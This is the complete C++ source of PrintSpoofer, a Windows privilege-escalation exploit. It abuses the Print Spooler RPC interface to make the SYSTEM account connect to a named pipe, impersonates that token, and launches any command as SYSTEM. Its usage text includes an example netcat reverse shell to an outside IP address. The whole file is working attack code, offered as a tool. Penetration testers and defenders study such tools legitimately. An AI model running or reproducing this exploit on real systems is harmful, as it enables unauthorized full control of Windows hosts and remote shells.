
#include <iostream>
#include <Windows.h>
#include <strsafe.h>
#include <sddl.h>
#include <userenv.h>

#include "PrintSpoofer.h"
#include "ms-rprn_h.h"

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "userenv.lib")
#pragma warning( disable : 28251 )

BOOL g_bInteractWithConsole = FALSE;
DWORD g_dwSessionId = 0;
LPWSTR g_pwszCommandLine = NULL;

int wmain(int argc, wchar_t** argv)
{
	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
		case 'h':
			PrintUsage();
			return 0;
		case 'i':
			g_bInteractWithConsole = TRUE;
			break;
		case 'd':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				g_dwSessionId = wcstoul(argv[1], NULL, 0);
				if (!g_dwSessionId)
				{
					wprintf(L"[-] Invalid session id: %ws\n", argv[1]);
					PrintUsage();
					return -1;
				}
			}
			else
			{
				wprintf(L"[-] Missing value for option: -d\n");
				PrintUsage();
				return -1;
			}
			break;
		case 'c':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				g_pwszCommandLine = argv[1];
			}
			else
			{
				wprintf(L"[-] Missing value for option: -c\n");
				PrintUsage();
				return -1;
			}
			break;
		default:
			wprintf(L"[-] Invalid argument: %ls\n", argv[1]);
			PrintUsage();
			return -1;
		}

		++argv;
		--argc;
	}

	if (g_bInteractWithConsole && g_dwSessionId)
	{
		wprintf(L"[-] More than one interaction mode was specified.\n");
		return -1;
	}

	if (!g_pwszCommandLine)
	{
		wprintf(L"[-] Please specify a command to execute\n");
		return -1;
	}

	return DoMain();
}

VOID PrintUsage()
{
	wprintf(
		L"\n"
		"PrintSpoofer v%ws (by @itm4n)\n"
		"\n"
		"  Provided that the current user has the SeImpersonate privilege, this tool will leverage the Print\n"
		"  Spooler service to get a SYSTEM token and then run a custom command with CreateProcessAsUser()\n"
		"\n",
		VERSION
	);
	wprintf(
		L"Arguments:\n"
		"  -c <CMD>    Execute the command *CMD*\n"
		"  -i          Interact with the new process in the current command prompt (default is non-interactive)\n"
		"  -d <ID>     Spawn a new process on the desktop corresponding to this session *ID* (check your ID with qwinsta)\n"
		"  -h          That's me :)\n"
		"\n"	
	);

	wprintf(
		L"Examples:\n"
		"  - Run PowerShell as SYSTEM in the current console\n"
		"      PrintSpoofer.exe -i -c powershell.exe\n"
		"  - Spawn a SYSTEM command prompt on the desktop of the session 1\n"
		"      PrintSpoofer.exe -d 1 -c cmd.exe\n"
		"  - Get a SYSTEM reverse shell\n"
		"      PrintSpoofer.exe -c \"c:\\Temp\\nc.exe 10.10.13.37 1337 -e cmd\"\n"
		"\n"
	);
}

DWORD DoMain()
{
	LPWSTR pwszPipeName = NULL;
	HANDLE hSpoolPipe = INVALID_HANDLE_VALUE;
	HANDLE hSpoolPipeEvent = INVALID_HANDLE_VALUE;
	HANDLE hSpoolTriggerThread = INVALID_HANDLE_VALUE;
	DWORD dwWait = 0;

	if (!CheckAndEnablePrivilege(NULL, SE_IMPERSONATE_NAME))
	{
		wprintf(L"[-] A privilege is missing: '%ws'\n", SE_IMPERSONATE_NAME);
		goto cleanup;
	}

	wprintf(L"[+] Found privilege: %ws\n", SE_IMPERSONATE_NAME);

	if (!GenerateRandomPipeName(&pwszPipeName))
	{
		wprintf(L"[-] Failed to generate a name for the pipe.\n");
		goto cleanup;
	}

	if (!(hSpoolPipe = CreateSpoolNamedPipe(pwszPipeName)))
	{
		wprintf(L"[-] Failed to create a named pipe.\n");
		goto cleanup;
	}

	if (!(hSpoolPipeEvent = ConnectSpoolNamedPipe(hSpoolPipe)))
	{
		wprintf(L"[-] Failed to connect the named pipe.\n");
		goto cleanup;
	}

	wprintf(L"[+] Named pipe listening...\n");

	if (!(hSpoolTriggerThread = TriggerNamedPipeConnection(pwszPipeName)))
	{
		wprintf(L"[-] Failed to trigger the Spooler service.\n");
		goto cleanup;
	}

	dwWait = WaitForSingleObject(hSpoolPipeEvent, 5000);
	if (dwWait != WAIT_OBJECT_0)
	{
		wprintf(L"[-] Operation failed or timed out.\n");
		goto cleanup;
	}

	GetSystem(hSpoolPipe);

cleanup:
	if (hSpoolPipe)
		CloseHandle(hSpoolPipe);
	if (hSpoolPipeEvent)
		CloseHandle(hSpoolPipeEvent);
	if (hSpoolTriggerThread)
		CloseHandle(hSpoolTriggerThread);

	return 0;
}

BOOL CheckAndEnablePrivilege(HANDLE hTokenToCheck, LPCWSTR pwszPrivilegeToCheck)
{
	BOOL bResult = FALSE;
	HANDLE hToken = INVALID_HANDLE_VALUE;

	DWORD dwTokenPrivilegesSize = 0;
	PTOKEN_PRIVILEGES pTokenPrivileges = NULL;

	LPWSTR pwszPrivilegeName = NULL;

	if (hTokenToCheck)
	{
		// If a token handle was supplied, check this token
		hToken = hTokenToCheck;
	}
	else
	{
		// If a token handle wasn't supplied, check the token of the current process
		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
		{
			wprintf(L"OpenProcessToken() failed. Error: %d\n", GetLastError());
			goto cleanup;
		}
	}

	if (!GetTokenInformation(hToken, TokenPrivileges, NULL, dwTokenPrivilegesSize, &dwTokenPrivilegesSize))
	{
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
		{
			wprintf(L"GetTokenInformation() failed. Error: %d\n", GetLastError());
			goto cleanup;
		}
	}

	pTokenPrivileges = (PTOKEN_PRIVILEGES)malloc(dwTokenPrivilegesSize);
	if (!pTokenPrivileges)
		goto cleanup;

	if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwTokenPrivilegesSize, &dwTokenPrivilegesSize))
	{
		wprintf(L"GetTokenInformation() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}

	for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++)
	{
		LUID_AND_ATTRIBUTES laa = pTokenPrivileges->Privileges[i];
		DWORD dwPrivilegeNameLength = 0;

		if (!LookupPrivilegeName(NULL, &(laa.Luid), NULL, &dwPrivilegeNameLength))
		{
			if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
			{
				wprintf(L"LookupPrivilegeName() failed. Error: %d\n", GetLastError());
				goto cleanup;
			}
		}

		dwPrivilegeNameLength++;
		pwszPrivilegeName = (LPWSTR)malloc(dwPrivilegeNameLength * sizeof(WCHAR));
		if (!pwszPrivilegeName)
			goto cleanup;

		if (!LookupPrivilegeName(NULL, &(laa.Luid), pwszPrivilegeName, &dwPrivilegeNameLength))
		{
			wprintf(L"LookupPrivilegeName() failed. Error: %d\n", GetLastError());
			goto cleanup;
		}

		if (!_wcsicmp(pwszPrivilegeName, pwszPrivilegeToCheck))
		{
			TOKEN_PRIVILEGES tp = { 0 };

			ZeroMemory(&tp, sizeof(TOKEN_PRIVILEGES));
			tp.PrivilegeCount = 1;
			tp.Privileges[0].Luid = laa.Luid;
			tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
			{
				wprintf(L"AdjustTokenPrivileges() failed. Error: %d\n", GetLastError());
				goto cleanup;
			}

			bResult = TRUE;
		}

		free(pwszPrivilegeName);

		if (bResult)
			break;
	}

cleanup:
	if (hToken)
		CloseHandle(hToken);
	if (pTokenPrivileges)
		free(pTokenPrivileges);

	return bResult;
}

BOOL GenerateRandomPipeName(LPWSTR *ppwszPipeName)
{
	UUID uuid = { 0 };

	if (UuidCreate(&uuid) != RPC_S_OK)
		return FALSE;

	if (UuidToString(&uuid, (RPC_WSTR*)&(*ppwszPipeName)) != RPC_S_OK)
		return FALSE;

	if (!*ppwszPipeName)
		return FALSE;

	return TRUE;
}

HANDLE CreateSpoolNamedPipe(LPWSTR pwszPipeName)
{
	HANDLE hPipe = NULL;
	LPWSTR pwszPipeFullname = NULL;
	SECURITY_DESCRIPTOR sd = { 0 };
	SECURITY_ATTRIBUTES sa = { 0 };

	pwszPipeFullname = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
	if (!pwszPipeFullname)
		return NULL;

	StringCchPrintf(pwszPipeFullname, MAX_PATH, L"\\\\.\\pipe\\%ws\\pipe\\spoolss", pwszPipeName);

	if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
	{
		wprintf(L"InitializeSecurityDescriptor() failed. Error: %d\n", GetLastError());
		free(pwszPipeFullname);
		return NULL;
	}

	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&sa)->lpSecurityDescriptor), NULL))
	{
		wprintf(L"ConvertStringSecurityDescriptorToSecurityDescriptor() failed. Error: %d\n", GetLastError());
		free(pwszPipeFullname);
		return NULL;
	}

	// The FILE_FLAG_OVERLAPPED flag is what allows us to create an async pipe.
	hPipe = CreateNamedPipe(pwszPipeFullname, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa);
	if (hPipe == INVALID_HANDLE_VALUE)
	{
		wprintf(L"CreateNamedPipe() failed. Error: %d\n", GetLastError());
		free(pwszPipeFullname);
		return NULL;
	}

	free(pwszPipeFullname);

	return hPipe;
}

HANDLE ConnectSpoolNamedPipe(HANDLE hPipe)
{
	HANDLE hPipeEvent = INVALID_HANDLE_VALUE;
	OVERLAPPED ol = { 0 };

	// Create a non-signaled event for the OVERLLAPED structure
	hPipeEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (!hPipeEvent)
	{
		wprintf(L"CreateEvent() failed. Error: %d\n", GetLastError());
		return NULL;
	}

	ZeroMemory(&ol, sizeof(OVERLAPPED));
	ol.hEvent = hPipeEvent;

	// Connect the pipe asynchronously
	if (!ConnectNamedPipe(hPipe, &ol))
	{
		if (GetLastError() != ERROR_IO_PENDING)
		{
			wprintf(L"ConnectNamedPipe() failed. Error: %d\n", GetLastError());
			return NULL;
		}
	}

	return hPipeEvent;
}

HANDLE TriggerNamedPipeConnection(LPWSTR pwszPipeName)
{
	HANDLE hThread = NULL;
	DWORD dwThreadId = 0;

	hThread = CreateThread(NULL, 0, TriggerNamedPipeConnectionThread, pwszPipeName, 0, &dwThreadId);
	if (!hThread)
		wprintf(L"CreateThread() failed. Error: %d\n", GetLastError());

	return hThread;
}

DWORD WINAPI TriggerNamedPipeConnectionThread(LPVOID lpParam)
{
	HRESULT hr = NULL;
	PRINTER_HANDLE hPrinter = NULL;
	DEVMODE_CONTAINER devmodeContainer = { 0 };

	LPWSTR pwszComputerName = NULL;
	DWORD dwComputerNameLen = MAX_COMPUTERNAME_LENGTH + 1;

	LPWSTR pwszTargetServer = NULL;
	LPWSTR pwszCaptureServer = NULL;

	LPWSTR pwszPipeName = (LPWSTR)lpParam;

	pwszComputerName = (LPWSTR)malloc(dwComputerNameLen * sizeof(WCHAR));
	if (!pwszComputerName)
		goto cleanup;

	if (!GetComputerName(pwszComputerName, &dwComputerNameLen))
		goto cleanup;

	pwszTargetServer = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
	if (!pwszTargetServer)
		goto cleanup;

	pwszCaptureServer = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
	if (!pwszCaptureServer)
		goto cleanup;

	StringCchPrintf(pwszTargetServer, MAX_PATH, L"\\\\%ws", pwszComputerName);
	StringCchPrintf(pwszCaptureServer, MAX_PATH, L"\\\\%ws/pipe/%ws", pwszComputerName, pwszPipeName);

	RpcTryExcept
	{
		if (RpcOpenPrinter(pwszTargetServer, &hPrinter, NULL, &devmodeContainer, 0) == RPC_S_OK)
		{
			RpcRemoteFindFirstPrinterChangeNotificationEx(hPrinter, PRINTER_CHANGE_ADD_JOB, 0, pwszCaptureServer, 0, NULL);
			RpcClosePrinter(&hPrinter);
		}
	}
	RpcExcept(EXCEPTION_EXECUTE_HANDLER);
	{
		// Expect RPC_S_SERVER_UNAVAILABLE
	}
	RpcEndExcept;

cleanup:
	if (pwszComputerName)
		free(pwszComputerName);
	if (pwszTargetServer)
		free(pwszTargetServer);
	if (pwszCaptureServer)
		free(pwszCaptureServer);
	if (hPrinter)
		RpcClosePrinter(&hPrinter);

	return 0;
}

BOOL GetSystem(HANDLE hPipe)
{
	BOOL bResult = FALSE;
	HANDLE hSystemToken = INVALID_HANDLE_VALUE;
	HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;

	DWORD dwCreationFlags = 0;
	LPWSTR pwszCurrentDirectory = NULL;
	LPVOID lpEnvironment = NULL;
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };

	if (!ImpersonateNamedPipeClient(hPipe)) 
	{
		wprintf(L"ImpersonateNamedPipeClient(). Error: %d\n", GetLastError());
		goto cleanup;
	}

	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken))
	{
		wprintf(L"OpenThreadToken(). Error: %d\n", GetLastError());
		goto cleanup;
	}

	if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
	{
		wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}

	if (g_dwSessionId)
	{
		if (!SetTokenInformation(hSystemTokenDup, TokenSessionId, &g_dwSessionId, sizeof(DWORD)))
		{
			wprintf(L"SetTokenInformation() failed. Error: %d\n", GetLastError());
			goto cleanup;
		}
	}
	
	dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
	dwCreationFlags |= g_bInteractWithConsole ? 0 : CREATE_NEW_CONSOLE;

	if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
		goto cleanup;

	if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
	{
		wprintf(L"GetSystemDirectory() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}

	if (!CreateEnvironmentBlock(&lpEnvironment, hSystemTokenDup, FALSE))
	{
		wprintf(L"CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}

	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");

	if (!CreateProcessAsUser(hSystemTokenDup, NULL, g_pwszCommandLine, NULL, NULL, g_bInteractWithConsole, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
	{
		if (GetLastError() == ERROR_PRIVILEGE_NOT_HELD)
		{
			wprintf(L"[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().\n");

			RevertToSelf();

			if (!g_bInteractWithConsole)
			{
				if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, g_pwszCommandLine, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
				{
					wprintf(L"CreateProcessWithTokenW() failed. Error: %d\n", GetLastError());
					goto cleanup;
				}
				else
				{
					wprintf(L"[+] CreateProcessWithTokenW() OK\n");
				}
			}
			else
			{
				wprintf(L"[!] CreateProcessWithTokenW() isn't compatible with option -i\n");
				goto cleanup;
			}
		}
		else
		{
			wprintf(L"CreateProcessAsUser() failed. Error: %d\n", GetLastError());
			goto cleanup;
		}
	}
	else
	{
		wprintf(L"[+] CreateProcessAsUser() OK\n");
	}

	if (g_bInteractWithConsole)
	{
		fflush(stdout);
		WaitForSingleObject(pi.hProcess, INFINITE);
	}

	bResult = TRUE;

cleanup:
	if (hSystemToken)
		CloseHandle(hSystemToken);
	if (hSystemTokenDup)
		CloseHandle(hSystemTokenDup);
	if (pwszCurrentDirectory)
		free(pwszCurrentDirectory);
	if (lpEnvironment)
		DestroyEnvironmentBlock(lpEnvironment);
	if (pi.hProcess)
		CloseHandle(pi.hProcess);
	if (pi.hThread)
		CloseHandle(pi.hThread);

	return bResult;
}

handle_t __RPC_USER STRING_HANDLE_bind(STRING_HANDLE lpStr)
{
	RPC_STATUS RpcStatus;
	RPC_WSTR StringBinding;
	handle_t BindingHandle;

	if (RpcStringBindingComposeW((RPC_WSTR)L"12345678-1234-ABCD-EF00-0123456789AB", (RPC_WSTR)L"ncacn_np", (RPC_WSTR)lpStr, (RPC_WSTR)L"\\pipe\\spoolss", NULL, &StringBinding) != RPC_S_OK)
		return NULL;

	RpcStatus = RpcBindingFromStringBindingW(StringBinding, &BindingHandle);

	RpcStringFreeW(&StringBinding);

	if (RpcStatus != RPC_S_OK)
		return NULL;

	return BindingHandle;
}

void __RPC_USER STRING_HANDLE_unbind(STRING_HANDLE lpStr, handle_t BindingHandle)
{
	RpcBindingFree(&BindingHandle);
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}
